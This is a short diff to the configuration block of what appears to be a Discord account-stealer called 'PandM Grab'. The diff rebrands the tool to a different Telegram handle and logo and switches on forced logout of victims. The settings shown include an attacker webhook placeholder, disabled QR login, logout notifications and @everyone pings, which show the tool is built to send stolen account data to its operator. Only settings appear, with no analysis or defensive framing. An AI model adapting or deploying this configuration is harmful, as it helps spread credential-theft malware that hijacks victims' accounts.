@@ -11,11 +11,11 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "P&M",
+    brand: "PandM",
 
     webhook: "REPLACE_ME",
 
-    logout: false,
+    logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "PandM | https://t.me/PandM_Grab",
+        username: "PandM | t.me/pluzdvlp",
         footer: {
-            text: `PandM | https://t.me/PandM_Grab`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `PandM | t.me/pluzdvlp`,
+            icon_url: "https://www.pluzdev.fr/assets/img/logo.png",
         },
-        href: "https://t.me/PandM_Grab",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "https://t.me/pluzdvlp",
+        avatar_url: "https://www.pluzdev.fr/assets/img/logo.png"
     },
 
     badges: {
